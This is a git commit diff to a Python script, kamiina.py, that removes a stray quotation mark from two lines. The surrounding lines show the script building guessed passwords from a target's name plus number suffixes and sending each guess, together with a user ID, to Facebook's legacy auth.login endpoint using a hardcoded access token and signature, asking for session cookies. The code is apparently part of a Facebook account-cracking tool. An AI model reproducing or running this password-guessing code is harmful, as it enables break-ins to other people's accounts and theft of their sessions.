92114604c3b627348980c20e7be2f5fc38ec8591
sufyanahma <63979270+sufyanahma@users.noreply.github.com>
2021-11-12 03:06:14 +0500

    Update kamiina.py

--- kamiina.py
+++ kamiina.py
@@ -730,7 +730,7 @@ def menu_select():
 
 		                                        else:
 
-		                                            pass6= name.lower()+p2"
+		                                            pass6= name.lower()+p2
 
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -764,7 +764,7 @@ def menu_select():
 
 		                                                else:
 
-		                                                    pass7= name.lower()+p1"
+		                                                    pass7= name.lower()+p1
 
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
